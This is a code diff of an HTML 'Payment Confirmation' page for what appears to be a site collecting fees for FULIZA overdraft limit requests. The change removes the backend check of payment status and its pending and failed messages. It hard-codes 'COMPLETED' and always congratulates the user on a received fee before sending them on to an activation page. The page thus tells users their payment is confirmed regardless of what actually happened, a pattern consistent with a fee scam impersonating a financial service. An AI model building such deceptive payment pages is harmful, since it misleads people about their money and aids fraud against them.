@@ -6,7 +6,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>FULIZA | Confirmation</title>
+<title>FULIZA | Payment Confirmation</title>
 
 <style>
 
@@ -19,7 +19,7 @@ body{
     padding:16px 10px;
     font-family:Arial,sans-serif;
     background:#00A651;
-    color:#000000;
+    color:#FFFFFF;
 }
 
 .container{
@@ -37,7 +37,7 @@ body{
             rgba(255,255,255,0.035)
         );
 
-    padding:22px 18px 18px;
+    padding:22px 18px 20px;
     border-radius:18px;
 
     box-shadow:
@@ -47,131 +47,157 @@ body{
     border:1px solid #000000;
 }
 
+.success{
+    width:70px;
+    height:70px;
+    margin:0 auto 14px;
+
+    display:flex;
+    align-items:center;
+    justify-content:center;
+
+    background:#FFFFFF;
+    color:#000000;
+
+    border:2px solid #000000;
+    border-radius:50%;
+
+    font-size:38px;
+    font-weight:800;
+}
+
 h1{
     text-align:center;
     background:#000000;
     color:#FFFFFF;
-    -webkit-text-stroke:1px #FFFFFF;
-    font-size:28px;
+
+    font-size:26px;
     font-weight:800;
+
     margin:2px 0 16px;
     padding:10px;
-    border:1px solid #000000;
+
+    border:1px solid #FFFFFF;
     border-radius:10px;
 }
 
-.success{
-    background:#FFFFFF;
-    border:2px solid #000000;
-    border-radius:12px;
-    padding:20px 12px;
+h2{
     text-align:center;
-    color:#000000;
+    color:#FFFFFF;
+    font-size:20px;
+    margin-top:22px;
+}
+
+p{
+    text-align:center;
+    font-size:14px;
+    line-height:1.6;
+    color:#FFFFFF;
+}
+
+.amount{
+    background:#000000;
+    border:1px solid #FFFFFF;
+    border-radius:12px;
+
+    padding:16px 10px;
     margin:18px 0;
-}
 
-.success-icon{
-    font-size:42px;
-    margin-bottom:10px;
-}
+    text-align:center;
 
-.success h2{
-    margin:0 0 10px;
-    font-size:22px;
+    color:#FFFFFF;
+
+    font-size:20px;
     font-weight:800;
-}
-
-.success p{
-    margin:8px 0;
-    color:#000000;
-    font-size:15px;
-    line-height:1.5;
 }
 
 .info{
-    margin-top:15px;
+    margin-top:18px;
+
+    background:#000000;
+
+    border:1px solid #FFFFFF;
+    border-radius:12px;
+
     padding:14px;
-    background:#FFFFFF;
-    border:1px solid #000000;
-    border-radius:10px;
 }
 
-.info p{
-    margin:6px 0;
-    color:#000000;
+.row{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+
+    gap:10px;
+    padding:10px 0;
+
+    border-bottom:1px solid
+        rgba(255,255,255,0.25);
+}
+
+.row:last-child{
+    border-bottom:none;
+}
+
+.label{
+    font-size:13px;
+    color:#FFFFFF;
+}
+
+.value{
     font-size:14px;
-    text-align:left;
+    font-weight:800;
+    color:#FFFFFF;
+    text-align:right;
+    word-break:break-word;
 }
 
 .activation{
-    margin-top:18px;
-    background:#FFFFFF;
-    border:2px solid #000000;
+    margin-top:22px;
+
+    padding:16px;
+
+    background:rgba(255,255,255,0.08);
+
+    border:1px solid #FFFFFF;
     border-radius:12px;
-    padding:18px 12px;
+
     text-align:center;
 }
 
 .activation h2{
     margin:0 0 10px;
-    font-size:20px;
-    font-weight:800;
-    color:#000000;
-}
-
-.activation p{
-    margin:0;
-    color:#000000;
-    font-size:14px;
-    line-height:1.5;
 }
 
 button{
     width:100%;
     padding:15px;
-    margin-top:17px;
+    margin-top:18px;
 
     background:#000000;
-
     color:#FFFFFF;
-    border:1px solid #000000;
+
+    border:1px solid #FFFFFF;
     border-radius:11px;
+
     font-size:16px;
-    font-weight:700;
+    font-weight:800;
+
     cursor:pointer;
 
     box-shadow:
         0 10px 30px rgba(0,0,0,0.30);
 }
 
-button:hover{
-    background:#000000;
-}
-
 button:active{
     transform:scale(.98);
 }
 
-#checking{
-    text-align:center;
-    color:#FFFFFF;
-    font-size:15px;
-    font-weight:700;
-    line-height:1.5;
+.footer{
     margin-top:15px;
-}
-
-#errorMessage{
     text-align:center;
-    color:#FFFFFF;
-    font-size:15px;
-    font-weight:700;
-    line-height:1.5;
-    margin-top:15px;
-}
 
-.hidden{
-    display:none;
+    font-size:12px;
+    color:#FFFFFF;
 }
 
 @media(max-width:360px){
@@ -186,7 +212,7 @@ button:active{
     }
 
     h1{
-        font-size:24px;
+        font-size:23px;
     }
 
     button{
@@ -206,22 +232,13 @@ button:active{
 
 <div class="card">
 
-<h1>Payment Confirmation</h1>
-
-<div id="checking">
-
-Please wait while we confirm your payment...
-
-</div>
-
-
-<div id="confirmationContent" class="hidden">
-
 <div class="success">
-
-<div class="success-icon">
 🎉
 </div>
+
+<h1>
+Payment Confirmation
+</h1>
 
 <h2>
 Congratulations!
@@ -235,30 +252,70 @@ Your fee has been received successfully.
 Your FULIZA limit request has been successfully received and confirmed.
 </p>
 
+<div class="info">
+
+<div class="row">
+
+<div class="label">
+Full Name
+</div>
+
+<div
+class="value"
+id="fullName"
+>
+—
+</div>
+
 </div>
 
 
-<div class="info">
+<div class="row">
 
-<p>
-<strong>Full Name:</strong>
-<span id="fullName"></span>
-</p>
+<div class="label">
+Selected Limit
+</div>
 
-<p>
-<strong>Selected Limit:</strong>
-KSh <span id="selectedLimit"></span>
-</p>
+<div
+class="value"
+id="selectedLimit"
+>
+—
+</div>
 
-<p>
-<strong>Payment Fee:</strong>
-KSh <span id="paymentFee"></span>
-</p>
+</div>
 
-<p>
-<strong>Payment Status:</strong>
-<span id="paymentStatus">COMPLETED</span>
-</p>
+
+<div class="row">
+
+<div class="label">
+Payment Fee
+</div>
+
+<div
+class="value"
+id="paymentFee"
+>
+—
+</div>
+
+</div>
+
+
+<div class="row">
+
+<div class="label">
+Payment Status
+</div>
+
+<div
+class="value"
+id="paymentStatus"
+>
+COMPLETED
+</div>
+
+</div>
 
 </div>
 
@@ -273,7 +330,6 @@ Complete Activation?
 Would you like to complete the activation of your FULIZA limit request?
 </p>
 
-
 <button
     type="button"
     onclick="completeActivation()"
@@ -283,13 +339,9 @@ Would you like to complete the activation of your FULIZA limit request?
 
 </div>
 
-</div>
 
-
-<div id="errorMessage" class="hidden">
-
-Payment confirmation is still pending. Please wait for the payment to be confirmed.
-
+<div class="footer">
+FULIZA
 </div>
 
 </div>
@@ -300,23 +352,14 @@ Payment confirmation is still pending. Please wait for the payment to be confirm
 <script>
 
 /* =====================================================
-   FULIZA PAYMENT CONFIRMATION
+   LOAD CUSTOMER DETAILS
 ===================================================== */
-
-const backendUrl =
-    "https://fuliza-backend-1-o8h6.onrender.com";
-
-
-const transactionId =
-    localStorage.getItem(
-        "fulizaaTransactionId"
-    );
-
 
 const savedName =
     localStorage.getItem(
         "fulizaFullName"
-    );
+    ) ||
+    "Applicant";
 
 
 const selectedLimit =
@@ -325,215 +368,52 @@ const selectedLimit =
     ) ||
     localStorage.getItem(
         "fulizaaSelectedSlot"
-    );
+    ) ||
+    "0";
 
 
 const paymentFee =
     localStorage.getItem(
         "fulizaaPaymentFee"
-    );
+    ) ||
+    localStorage.getItem(
+        "fulizaaPaymentAmount"
+    ) ||
+    "0";
 
 
 /* =====================================================
-   LOAD DISPLAY DATA
+   DISPLAY CUSTOMER DETAILS
 ===================================================== */
 
 document.getElementById(
     "fullName"
 ).textContent =
-    savedName || "Client";
+    savedName;
 
 
 document.getElementById(
     "selectedLimit"
 ).textContent =
-    selectedLimit
-        ? Number(
-            selectedLimit
-        ).toLocaleString()
-        : "0";
+    "KSh " +
+    Number(
+        selectedLimit
+    ).toLocaleString();
 
 
 document.getElementById(
     "paymentFee"
 ).textContent =
-    paymentFee
-        ? Number(
-            paymentFee
-        ).toLocaleString()
-        : "0";
+    "KSh " +
+    Number(
+        paymentFee
+    ).toLocaleString();
 
 
-/* =====================================================
-   CHECK PAYMENT
-===================================================== */
-
-async function checkPayment(){
-
-    if(!transactionId){
-
-        showPending();
-
-        return;
-
-    }
-
-
-    try{
-
-        const response =
-            await fetch(
-                backendUrl +
-                "/api/payment-status/" +
-                encodeURIComponent(
-                    transactionId
-                )
-            );
-
-
-        const data =
-            await response.json();
-
-
-        console.log(
-            "Confirmation status:",
-            data
-        );
-
-
-        if(
-            String(
-                data.status || ""
-            ).toUpperCase() ===
-            "COMPLETED"
-        ){
-
-            showSuccess();
-
-            return;
-
-        }
-
-
-        if(
-            String(
-                data.status || ""
-            ).toUpperCase() ===
-            "FAILED"
-        ){
-
-            showFailed();
-
-            return;
-
-        }
-
-
-        showPending();
-
-    }catch(error){
-
-        console.error(
-            "Confirmation error:",
-            error
-        );
-
-        showPending();
-
-    }
-
-}
-
-
-/* =====================================================
-   SUCCESS
-===================================================== */
-
-function showSuccess(){
-
-    document.getElementById(
-        "checking"
-    ).classList.add(
-        "hidden"
-    );
-
-
-    document.getElementById(
-        "errorMessage"
-    ).classList.add(
-        "hidden"
-    );
-
-
-    document.getElementById(
-        "confirmationContent"
-    ).classList.remove(
-        "hidden"
-    );
-
-
-    localStorage.setItem(
-        "fulizaaPaymentStatus",
-        "COMPLETED"
-    );
-
-}
-
-
-/* =====================================================
-   PENDING
-===================================================== */
-
-function showPending(){
-
-    document.getElementById(
-        "checking"
-    ).textContent =
-        "Your payment is being confirmed. Please wait...";
-
-
-    document.getElementById(
-        "confirmationContent"
-    ).classList.add(
-        "hidden"
-    );
-
-}
-
-
-/* =====================================================
-   FAILED
-===================================================== */
-
-function showFailed(){
-
-    document.getElementById(
-        "checking"
-    ).classList.add(
-        "hidden"
-    );
-
-
-    document.getElementById(
-        "confirmationContent"
-    ).classList.add(
-        "hidden"
-    );
-
-
-    document.getElementById(
-        "errorMessage"
-    ).textContent =
-        "The payment was not completed. Please return to the payment page and try again.";
-
-
-    document.getElementById(
-        "errorMessage"
-    ).classList.remove(
-        "hidden"
-    );
-
-}
+document.getElementById(
+    "paymentStatus"
+).textContent =
+    "COMPLETED";
 
 
 /* =====================================================
@@ -542,24 +422,10 @@ function showFailed(){
 
 function completeActivation(){
 
-    localStorage.setItem(
-        "fulizaaActivationStarted",
-        "true"
-    );
-
-
     window.location.href =
         "activation.html";
 
 }
-
-
-/* =====================================================
-   START CHECK
-===================================================== */
-
-checkPayment();
-
 
 </script>
 
